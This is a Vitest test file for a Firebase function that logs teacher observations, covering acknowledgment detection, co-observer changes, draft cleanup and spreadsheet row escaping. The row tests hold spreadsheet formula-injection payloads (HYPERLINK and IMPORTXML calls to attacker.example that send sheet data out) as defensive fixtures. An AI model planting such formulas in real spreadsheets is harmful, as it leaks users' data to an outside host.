import { describe, expect, it } from 'vitest';

process.env['FIREBASE_CONFIG'] = JSON.stringify({ projectId: 'test' });
process.env['GCLOUD_PROJECT'] = 'test';
const {
  buildDeletedRow,
  buildRow,
  coObserverChanges,
  draftFolderToDelete,
  isNewlyAcknowledged,
  sheetText,
} = await import('./onObservationWritten.js');

describe('isNewlyAcknowledged', () => {
  it('fires only when acknowledgedAt goes from unset to set', () => {
    const at = new Date();
    expect(isNewlyAcknowledged({ acknowledgedAt: null }, { acknowledgedAt: at })).toBe(true);
    expect(isNewlyAcknowledged({}, { acknowledgedAt: at })).toBe(true);
    expect(isNewlyAcknowledged({ acknowledgedAt: at }, { acknowledgedAt: at })).toBe(false);
    expect(isNewlyAcknowledged({ acknowledgedAt: null }, { acknowledgedAt: null })).toBe(false);
    // Reopen clears it; that's not an acknowledgment.
    expect(isNewlyAcknowledged({ acknowledgedAt: at }, { acknowledgedAt: null })).toBe(false);
  });
});

describe('coObserverChanges', () => {
  const base = { observerEmail: 'owner@x.org', observedEmail: 'teacher@x.org' };

  it('reports added and removed co-observers, case-insensitively', () => {
    expect(
      coObserverChanges(
        { ...base, coObserverEmails: ['A@x.org', 'b@x.org'] },
        { ...base, coObserverEmails: ['a@x.org', 'c@x.org'] },
      ),
    ).toEqual({ added: ['c@x.org'], removed: ['b@x.org'] });
  });

  it('treats a missing list as empty', () => {
    expect(coObserverChanges(base, { ...base, coObserverEmails: ['a@x.org'] })).toEqual({
      added: ['a@x.org'],
      removed: [],
    });
    expect(coObserverChanges(base, base)).toEqual({ added: [], removed: [] });
  });

  it('never reports the observer or observed staff as removed', () => {
    expect(
      coObserverChanges(
        { ...base, coObserverEmails: ['Owner@x.org', 'teacher@x.org'] },
        { ...base, coObserverEmails: [] },
      ),
    ).toEqual({ added: [], removed: [] });
  });
});

describe('draftFolderToDelete', () => {
  it("deletes a never-finalized Draft's folder", () => {
    expect(
      draftFolderToDelete({ status: 'Draft', driveFolderId: 'f1', pdfDriveFileId: null }),
    ).toBe('f1');
  });

  it('keeps the folder of a reopened Draft, which holds the PDF the teacher was sent', () => {
    expect(
      draftFolderToDelete({ status: 'Draft', driveFolderId: 'f1', pdfDriveFileId: 'pdf1' }),
    ).toBeNull();
  });

  it('keeps a Finalized folder, and does nothing without a folder', () => {
    expect(draftFolderToDelete({ status: 'Finalized', driveFolderId: 'f1' })).toBeNull();
    expect(draftFolderToDelete({ status: 'Draft', driveFolderId: null })).toBeNull();
    expect(draftFolderToDelete(undefined)).toBeNull();
  });
});

describe('Master Log rows', () => {
  const injected =
    '=HYPERLINK("https:"&"//attacker.example/?d="&ENCODEURL(TEXTJOIN("|",1,A2:L500)),"Open PDF")';

  it('neutralises every character that can start a formula', () => {
    for (const lead of ['=', '+', '-', '@', '\t', '\r', '\n']) {
      expect(sheetText(`${lead}1+1`)).toBe(`'${lead}1+1`);
    }
    expect(sheetText('Spring walkthrough')).toBe('Spring walkthrough');
    expect(sheetText('')).toBe('');
  });

  it('writes observer-controlled fields as plain text', () => {
    const row = buildRow('=id', {
      observerEmail: '@owner@x.org',
      observedEmail: '+teacher@x.org',
      observedName: '-Name',
      observedRole: '=IMPORTXML("https://attacker.example","//a")',
      type: '\t=1',
      status: 'Draft',
      observationName: injected,
      driveFolderId: 'folder1',
      pdfDriveFileId: 'pdf1',
    });
    expect(row).toHaveLength(14);
    expect(row.filter((cell) => /^[=+\-@\t\r\n]/.test(cell))).toEqual([]);
    expect(row[0]).toBe("'=id");
    expect(row[10]).toBe(`'${injected}`);
    // Legitimate values are untouched.
    expect(row[7]).toBe('Draft');
    expect(row[12]).toBe('https://drive.google.com/drive/folders/folder1');
    expect(row[13]).toBe('https://drive.google.com/file/d/pdf1/view');
  });

  it('neutralises the row left for a deleted observation', () => {
    const row = buildDeletedRow('obs1', {
      observerEmail: 'owner@x.org',
      observedEmail: 'teacher@x.org',
      observedName: injected,
      type: '=1',
    });
    expect(row).toHaveLength(14);
    expect(row[3]).toBe(`'${injected}`);
    expect(row[6]).toBe("'=1");
    expect(row[7]).toBe('[DELETED]');
  });
});
